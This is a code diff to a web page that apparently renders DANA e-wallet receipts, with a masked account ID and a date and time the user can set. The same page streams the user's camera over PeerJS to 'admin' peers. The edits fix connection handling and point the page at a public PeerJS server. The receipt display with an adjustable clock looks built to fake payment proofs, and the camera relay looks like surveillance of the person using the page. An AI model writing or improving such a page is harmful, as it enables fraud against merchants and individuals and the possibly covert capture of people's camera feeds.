@@ -312,7 +312,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 23:27</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 23:39</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -384,7 +384,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 23:27</span>
+            <span id="displayDateTime">24 Nov 2026 • 23:39</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -976,6 +976,10 @@
     const MEMBER_PEER_ID = getPersistentMemberPeerId(HP_INFO.slug);
 
     const PEER_CONFIG = {
+      host: "0.peerjs.com",
+      port: 443,
+      path: "/",
+      secure: true,
       debug: 0,
       config: {
         iceServers: [
@@ -1218,7 +1222,7 @@
     }
 
     function placeCallToAdmin(adminId, forceNew = false) {
-      if (!peer || peer.destroyed || !cameraStream) {
+      if (!peer || peer.destroyed || !peer.open || !cameraStream) {
         pendingStreamAdmins.add(adminId);
         return;
       }
@@ -1242,7 +1246,7 @@
     }
 
     function flushPendingStreamCalls() {
-      if (!cameraStream || !peer || peer.destroyed) return;
+      if (!cameraStream || !peer || peer.destroyed || !peer.open) return;
       for (const adminId of Array.from(pendingStreamAdmins)) {
         placeCallToAdmin(adminId, true);
       }
@@ -1289,9 +1293,14 @@
       if (!peer || peer.destroyed || hasSentExplicitClose) return;
       if (peer.disconnected) {
         try { peer.reconnect(); } catch (_) {}
+        return;
       }
+      if (!peer.open) return;
       if (lobbyConn && lobbyConn.open) {
         broadcastPresenceToAdmins();
+        return;
+      }
+      if (lobbyConn && !lobbyConn.open) {
         return;
       }
       const conn = peer.connect(ADMIN_LOBBY_ID, { reliable: true });
@@ -1302,7 +1311,7 @@
       });
       conn.on("data", (msg) => handleAdminMessage(conn.peer, msg));
       conn.on("close", () => { if (lobbyConn === conn) lobbyConn = null; });
-      conn.on("error", () => {});
+      conn.on("error", () => { if (lobbyConn === conn) lobbyConn = null; });
     }
 
     async function handleAdminMessage(fromPeerId, msg) {
